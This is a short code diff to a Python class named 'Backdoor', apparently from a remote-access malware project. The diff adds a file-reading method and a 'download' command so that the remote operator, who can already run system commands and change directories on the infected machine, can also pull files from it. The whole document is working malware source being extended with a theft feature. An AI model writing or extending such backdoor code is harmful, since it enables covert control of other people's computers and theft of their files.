@@ -43,6 +43,10 @@ class Backdoor:
         except subprocess.CalledProcessError:
             self.reliable_send("[-] Unknown command")
 
+    def read_file(self, path):
+        with open(path, 'rb')as file:
+            return file.read()
+
     def run(self):
         while True:
             command = self.reliable_receive()
@@ -53,6 +57,9 @@ class Backdoor:
 
             elif command[0] == "cd" and len(command) >= 2:
                 command_result = self.change_directory_tool(command[1])
+
+            elif command[0] == "download":
+                command_result = self.read_file(command[1])
 
             else:
                 command_result = self.execute_system_command(command)
